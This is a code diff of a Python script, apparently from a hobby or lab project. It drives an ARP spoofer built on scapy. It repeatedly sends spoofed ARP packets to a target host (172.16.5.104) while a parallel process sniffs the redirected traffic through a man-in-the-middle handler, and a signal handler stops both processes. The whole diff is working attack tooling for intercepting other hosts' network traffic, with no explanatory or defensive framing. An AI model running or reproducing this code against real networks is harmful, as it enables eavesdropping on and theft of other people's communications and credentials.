@@ -1,28 +1,82 @@
+from logging import basicConfig, DEBUG, getLogger
+from scapy.all import *
+from multiprocessing import Process
+from scapy.layers.inet import IP, ICMP
+# basicConfig(level=DEBUG) 
 from arpSpoofer import ARPSpoofer
 import time
+import signal
+import sys
+
+logger = getLogger(__name__)
+procs = []
+# from multiprocessing import Process
+# from scapy.all import sniff
+
+# def packet_sniffer():
+#     # Define your sniffing logic here
+#     def sniff_callback(packet):
+#         # Process each sniffed packet here
+#         print(packet.show())
+
+#     # Start sniffing
+#     sniff(prn=sniff_callback, store=0)
+
+# if __name__ == "__main__":
+#     # Start the packet sniffing process
+#     sniffer_process = Process(target=packet_sniffer)
+#     sniffer_process.start()
+
+#     # You can do other things here while the sniffer is running
+
+#     # Wait for the sniffer process to finish (optional)
+#     sniffer_process.join()
+
+    
+def mitm_func(arp):
+    sniff(prn = arp.mitm_packet_handler)
+def start_mitm_process(arp):
+    proc = Process(target=mitm_func, args=(arp,))
+    proc.start()
+    procs.append(proc)
+    logger.debug("Started mitm process")
+
+def spoofing_func(arp, spoof_source=False):
+    logger.debug("Spoofing these clients")
+    logger.debug(arp.spoofing_clients)
+    while True:
+        for client in arp.spoofing_clients:
+            arp._create_and_send_spoofed_packets(client, spoof_source)                
+        time.sleep(2)
+def start_spoofing_process(arp):
+    proc = Process(target=spoofing_func, args=(arp,))
+    proc.start()
+    procs.append(proc)
+    logger.debug("Started spoofing process")
+
+    # def stop_spoofing_process(self):
+    #     if self.spoofer_proc != None:
+    #         self.spoofer_proc.terminate()
+    #         self.spoofer_proc = None
+    #     else:
+    #         raise Scapy_Exception(f"Spoofing process not active")
+    #     logger.debug("Stopped the spoofing process")
+
 
 if __name__ == '__main__':
     arp = ARPSpoofer()
-    arp.spoof_client('172.16.5.100')
-    arp.start_spoofing_process()
+    arp.spoof_client('172.16.5.104', 'mitm')
+    start_spoofing_process(arp)
+    start_mitm_process(arp)
 
-    while True:
-        time.sleep(0.1)
-# from multiprocessing import Process, freeze_support
-# import time
+    def signal_handler(sig, frame):
+        print('You pressed Ctrl+C!')
+        for proc in procs:
+            proc.terminate()
+        sys.exit(1)
 
-
-# def funct():
-#     print("Helllooo")
-
-
-# if __name__ == '__main__':
-#     # freeze_support()
-#     proc = Process(target=funct)
-#     proc.start()
-#     time.sleep(3)
-#     proc.join()
-
+    signal.signal(signal.SIGINT, signal_handler)
+    signal.pause()
 
 # from scapy.all import *
 # from scapy.layers.l2 import ARP, Ether
